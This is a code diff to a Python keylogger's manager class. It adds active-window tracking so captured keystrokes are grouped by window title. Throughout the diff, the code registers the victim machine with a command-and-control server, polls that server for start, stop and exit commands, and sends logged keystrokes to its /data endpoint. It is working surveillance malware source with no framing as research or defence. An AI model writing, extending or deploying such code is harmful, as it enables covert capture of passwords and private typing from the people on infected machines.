@@ -11,6 +11,7 @@ from keylogger.sinker import Sinker
 from keylogger.processor import Processor
 from keylogger.listner import LinuxKeylogger, WindowsKeylogger, Listener
 from keylogger.system_info import get_system_info
+from keylogger.active_window import WindowTracker
 
 logger = logging.getLogger(__name__)
 
@@ -47,43 +48,64 @@ class DefaultManager:
 
     def __init__(
         self,
-        endpoint: str = "http://localhost:5000",
+        endpoint: Optional[str] = None,
         log_path: Optional[str] = None,
         push_interval: int = 10,
     ):
-        # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
-        if os.name == "vnt":
-            keylogger = WindowsKeylogger()
-        else:
-            keylogger = LinuxKeylogger()
-
-        self.processor = Processor("")
         self.endpoint = endpoint
+        self.log_path = log_path
+        self.interval = push_interval
+        self.processor = Processor("")
         self.machine_id = self.processor.mac
 
-        self.sink = []
+        # Create the sinks
+        self.sinks = []
         if log_path:
-            self.sink.append(FileWriter(log_path))
+            self.sinks.append(FileWriter(log_path))
         if self.endpoint:
-            self.sink.append(NetworkWriter(self.endpoint))
+            self.sinks.append(NetworkWriter(self.endpoint + "/data"))
 
-        self.listner = keylogger
-        self.interval = push_interval
+    def _setup(self):
+        # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
+        if os.name == "vnt":
+            klogger: Listener = WindowsKeylogger()
+            self.window_tracker = None
+        else:
+            klogger: Listener = LinuxKeylogger()
+            # Start a new sequence when the active window changes
+            try:
+                self.window_tracker = WindowTracker(
+                    # use lambda to call the start_new_sequence method with the window title
+                    lambda w: klogger.start_new_sequence(w.title or w.process_name)
+                )
+            except Exception:
+                logger.error("Failed to create the WindowTracker", exc_info=False)
+                self.window_tracker = None
+
+        self.listner = klogger
+
+        # Create a thread to run the loop
         self._loop_thread = threading.Thread(target=self._loop)
-        self.start_loop_thread = threading.Thread(target=self.check_start)
         self._stopped = False
 
     def start(self) -> None:
+        logger.debug("Starting the manager")
+        self._setup()
         self.listner.start()
+        if self.window_tracker:
+            self.window_tracker.start()
         self._loop_thread.start()
         self._stopped = False
         self._c2c_init()
 
     def stop(self) -> None:
         logger.debug("Stopping the manager")
-        self.listner.stop()
-
         self._stopped = True
+
+        self.listner.stop()
+        if self.window_tracker:
+            self.window_tracker.stop()
+
         if self._loop_thread and self._loop_thread.is_alive():
             self._loop_thread.join()
 
@@ -94,10 +116,15 @@ class DefaultManager:
         This function will start the manager, and then long-poll the C2C server
         for control commands.
         """
-        ctrl = None
+        last = None
 
-        while ctrl := self._c2c_ctrl(last=ctrl):
-            logger.info(f"Received control command: {ctrl}")
+        while ctrl := self._c2c_ctrl(last=last):
+            logger.debug(f"Received control command: {ctrl}")
+
+            if last == ctrl:
+                continue
+
+            last = ctrl
 
             if ctrl == "exit":
                 break
@@ -111,23 +138,37 @@ class DefaultManager:
             self.stop()
 
     def _loop(self):
-        # the loop that gets the data from the listener, processes it, and then sinks it.
+        elpased = 0
+
+        # Run the loop until the manager is stopped
         while not self._stopped:
-            data = self.listner.get_data()
-            if data:
-                processed_data = self.processor.process_data(data)
-                for sink in self.sink:
-                    sink.sink(processed_data)
-            time.sleep(self.interval)
+            # If the interval has passed, get the data from the listener,
+            # process it, and then sink it.
+            if elpased >= self.interval:
+                data = self.listner.get_data()
+                for d in data:
+                    if not d.data:
+                        continue
+
+                    processed_data = self.processor.process_data(d)
+                    for sink in self.sinks:
+                        # Sink the processed data to all the sinks
+                        sink.sink(processed_data)
+                elpased = 0
+
+            time.sleep(1)
+            elpased += 1
 
     def _c2c_init(self):
         # Initialize the connection to the C2C server
         if not self.endpoint:
             return False
 
+        system_info = get_system_info()
         machine_info = {
-            "id": "",
-            "info": get_system_info(),
+            "name": system_info.get("pc_name", "Unknown"),
+            "machine_id": self.machine_id,
+            "info": system_info,
         }
 
         resp = requests.post(
@@ -135,7 +176,8 @@ class DefaultManager:
             json=machine_info,
         )
         logger.info(f"Connected to the C2C server: {self.endpoint}")
-        if resp.status_code != 200:
+        # Check for non-2xx status codes
+        if resp.status_code < 200 or resp.status_code >= 300:
             logger.error(
                 f"Failed to send machine info to the C2C server: {self.endpoint}"
             )
@@ -148,13 +190,23 @@ class DefaultManager:
         """
 
         if not self.endpoint:
-            return "exit"
+            if last:
+                try:
+                    time.sleep(10)
+                    return last
+                except KeyboardInterrupt:
+                    return "exit"
+
+            return "start"
 
         try:
             resp = requests.get(
                 f"{self.endpoint}/ctrl",
                 params={"last": last, "machine_id": self.machine_id},
             )
+        except requests.exceptions.ConnectionError as e:
+            logger.error(f"Failed to connect to the C2C server: {self.endpoint}", e)
+            return
         except requests.exceptions.RequestException as e:
             logger.error(
                 f"Failed to get the control command from the C2C server: {self.endpoint}",
@@ -163,6 +215,12 @@ class DefaultManager:
             return
         except KeyboardInterrupt:
             return "exit"
+        except Exception as e:
+            logger.error(
+                f"Failed to get the control command from the C2C server: {self.endpoint}",
+                e,
+            )
+            return
 
         if resp.status_code != 200:
             logger.error(
@@ -171,4 +229,6 @@ class DefaultManager:
             )
             return "exit"
 
-        return resp.json().get("ctrl", "exit")
+        logger.debug(f"Received control command: {resp.json().get('ctrl', '')}")
+
+        return resp.json().get("ctrl", "")
